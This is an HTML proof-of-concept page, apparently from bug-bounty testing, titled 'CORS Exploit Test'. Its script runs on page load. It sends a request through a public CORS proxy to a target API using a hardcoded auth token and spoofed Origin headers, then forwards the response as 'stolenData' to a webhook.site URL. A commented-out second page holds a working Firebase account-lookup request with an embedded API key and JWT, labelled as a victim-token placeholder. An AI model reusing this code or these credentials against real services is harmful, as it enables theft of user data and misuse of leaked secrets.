<!DOCTYPE html>
<html>
<head>
    <title>CORS Exploit Test</title>
    <script>
        console.log("CORS Exploit Test script loaded and running...");

        // Define the proxy URL and target endpoint
        const proxyURL = "https://cors-anywhere.herokuapp.com/"; // Replace with your own proxy if needed
        const targetURL = "https://api.company-target.com/api/v3/ip.json";
        const webhookURL = "https://webhook.site/90a9a04b-72c9-4653-a2c2-f0a66c64559c";

        async function fetchDataAndForward() {
            try {
                // Step 1: Fetch data from the target URL via proxy
                const response = await fetch(proxyURL + targetURL, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json",
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
                        "Referer": "https://varad4-0-4.github.io",
                        "Origin": "https://varad4-0-4.github.io"
                    },
                    body: JSON.stringify({
                        src: "tag",
                        auth: "mHlqHytbs5xRhLbSvPSKl4PqNQJrYCYgov6cXimN"
                    })
                });

                if (!response.ok) {
                    throw new Error(`Target fetch failed: ${response.status} ${response.statusText}`);
                }

                const data = await response.json();
                console.log("Data retrieved from target:", data);

                // Step 2: Send the extracted data to the Webhook
                const webhookResponse = await fetch(webhookURL, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify({ stolenData: data })
                });

                if (!webhookResponse.ok) {
                    throw new Error(`Webhook send failed: ${webhookResponse.status} ${webhookResponse.statusText}`);
                }

                console.log("Data successfully sent to Webhook.site");

            } catch (err) {
                console.error("Error occurred:", err);
            }
        }

        // Run the function to start the exploit
        fetchDataAndForward();
    </script>
</head>
<body>
    <h1>CORS Exploit Test</h1>
    <p>Check the browser console and Webhook.site for results.</p>
</body>
</html>


<!-- <!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CORS Exploit PoC</title>
</head>
<body>
    <h1>CORS Exploit Demo</h1>
    <p id="result">Fetching data...</p>
    <script>
        // Define the API endpoint and payload
        const apiEndpoint = "https://identitytoolkit.googleapis.com/v1/accounts:lookup?key=AIzaSyC7J-OjmaQ6igkRmD5KNq2ZjbBDNgVNcIg";
        const payload = {
            idToken: "eyJhbGciOiJSUzI1NiIsImtpZCI6IjkyODg2OGRjNDRlYTZhOThjODhiMzkzZDM2NDQ1MTM2NWViYjMwZDgiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiJodHRwczovL3NlY3VyZXRva2VuLmdvb2dsZS5jb20vcm9ib3NoYWRvdy1uZXR3b3JrLXNjYW5uZXIiLCJhdWQiOiJyb2Jvc2hhZG93LW5ldHdvcmstc2Nhbm5lciIsImF1dGhfdGltZSI6MTczMjIwNjY0OSwidXNlcl9pZCI6IkRRQk5Ib25NaWFiSFcyNG15Y1FvRFNvamk3MzIiLCJzdWIiOiJEUUJOSG9uTWlhYkhXMjRteWNRb0RTb2ppNzMyIiwiaWF0IjoxNzMyMjA2NjQ5LCJleHAiOjE3MzIyMTAyNDksImVtYWlsIjoidGVzdGluZ0Byb2Jvc2hhZG93LmNvbSIsImVtYWlsX3ZlcmlmaWVkIjpmYWxzZSwiZmlyZWJhc2UiOnsiaWRlbnRpdGllcyI6eyJlbWFpbCI6WyJ0ZXN0aW5nQHJvYm9zaGFkb3cuY29tIl19LCJzaWduX2luX3Byb3ZpZGVyIjoicGFzc3dvcmQifX0.fH-Lz921t5XQDGcVxnFdqX_KkyzXOKQak1KYsEkTWMPC-Fv48MC4rVF4Imju8sEluthvebttL9Bbu5bTtqosToMeWcyi1bYtpkALHNyQIWdKOTRQzx2TjrauTnCvIg8pTQwCwk0do-sLf4Pgr6KsFYmSL4IMpVOjuHRsFnS5at0xANKPAKyC7-Bj4HzIMkBEd5SgcgIs3rngO39gtpa4IV1p1KjInC4eIwx95mLi49Gl-5KfT-SUwygIEDA7K_1NZbnOq423-TNSgEvaoavHOE1ccixjgI1SrbxDSeem_6jBnkWv8MGqa_Cljzj_vVJ4Dfc2WhN9BLdS3omd87E5_A"
            // Replace with the victim's token
        };

        // Function to fetch data
        async function fetchData() {
            try {
                const response = await fetch(apiEndpoint, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json",
                        "X-Client-Version": "Firefox/JsCore/9.23.0/FirebaseCore-web",
                        "X-Firebase-Gmpid": "1:23092714539:web:301a575dc5381b26689e6e",
                    },
                    body: JSON.stringify(payload),
                });

                // Check if the response is successful
                if (!response.ok) {
                    throw new Error(`HTTP error! Status: ${response.status}`);
                }

                // Parse and display the response
                const data = await response.json();
                console.log("Fetched Data:", data);
                document.getElementById("result").textContent = JSON.stringify(data, null, 2);
            } catch (error) {
                console.error("Error fetching data:", error);
                document.getElementById("result").textContent = `Error: ${error.message}`;
            }
        }

        // Trigger the fetch on page load
        fetchData();
    </script>
</body>
</html> -->
